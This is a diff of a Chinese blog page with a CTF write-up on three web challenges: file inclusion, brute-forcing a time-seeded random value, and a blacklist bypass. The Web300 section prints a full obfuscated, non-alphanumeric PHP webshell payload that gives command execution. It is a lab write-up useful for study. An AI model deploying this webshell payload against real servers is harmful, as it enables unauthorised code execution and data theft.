@@ -237,7 +237,7 @@ white-space: pre;
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h3><p>根据题目提示，上传一个PNG文件，服务器就会保存它。然后随便上传了一个png文件，发现302，什么东西都没有。访问首页发现 op是一个get参数，尝试其他特殊字符，接着给我弹出来一个<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/6795472.jpg" alt=""><br>吓了宝宝一跳，不要怂就是干，然后尝试文件包含读index.php，读到源码<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/45664192.jpg" alt=""><br>通过include以及存在的链接，然后读upload.php，发现common.php继续读，尝试读flag.php，flag直接出来了,233333<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/77661805.jpg" alt=""><br>后面读源码发现还有其他方法，绕过上传图片使用zip://包含webshell也可以任意执行命令，从而读取flag.php，查看源码后发现flag。<br>flag截图如下:<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/31346264.jpg" alt=""></p>
 <h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h3><p>打开首页发现要输入一个随机值，尝试刷新，发现页面有变化，但不知道算法，爆破不了，题目未改之前通过swp查找源码都没找到，后面题目改了一下，通过swp源码泄露读到源码。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/65033795.jpg" alt=""><br>randpwd随机生成，跟time()有关，开始构造代码进行爆破，获取网页内容并打印出来。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/52296261.jpg" alt=""><br>经过一段时间爆破，得到flag，截图如下:<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/7605960.jpg" alt=""></p>
 <h3 id="Web300"><a href="#Web300" class="headerlink" title="Web300"></a>Web300</h3><p>打开首页，对源代码进行分析，发现黑名单过滤了很多字符，参数传值不在黑名单会直接写入文件中，文件名随机生成，经过测试还有几个字符没有进行过滤，例如<code>$_()[]+’;</code> , 然后开始构造webshell。<br>由于+在传送中会被解释为空格，所以需要提前url编码为%2b<br>Payload:</p>
-<pre><code>$_=&#39;&#39;;$_[%2b$_]%2b%2b;$_=$_.&#39;&#39;;$__=$_[%2b&#39;&#39;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&#39;_&#39;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]); 
+<pre><code>$_=&apos;&apos;;$_[%2b$_]%2b%2b;$_=$_.&apos;&apos;;$__=$_[%2b&apos;&apos;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&apos;_&apos;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]); 
 </code></pre><p>通过content传参，成功后会得到一个shell的地址。<br><code>http://x.x.x.x/?content=payload</code><br>打开shell地址，post数据过去,查看源码读到flag。如下图：<br><img src="http://p00fayrsx.bkt.clouddn.com/17-11-26/78992810.jpg" alt=""><br>参考链接：<a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/" target="_blank" rel="noopener">一道好玩的webshell题</a></p>
 <p><em>转载请保留原文链接及作者。</em><span id="busuanzi_container_page_pv" style="color: #ddd;"><br>  本文总阅读量：<span id="busuanzi_value_page_pv"></span>次<br></span></p>
 
@@ -384,7 +384,79 @@ white-space: pre;
     
     
     
-    <div class="total-archive" >目前才写: 5 篇博文，好好努力吧，骚年。 </div>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive" >目前才写: 9 篇博文，好好努力吧，骚年。 </div>
     
     <div class="post-archive">
     
@@ -393,6 +465,26 @@ white-space: pre;
     
     <div class="archive-year"> 2017 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-6/" >phpcms 2008 sp4 爆路径及任意文件删除漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-4/" >Discuz!漫游插件API本地包含漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-5/" >PHPCMS通杀XSS-2010.08</a>
+        </li>
     
     
         <li class="archive-post-item">
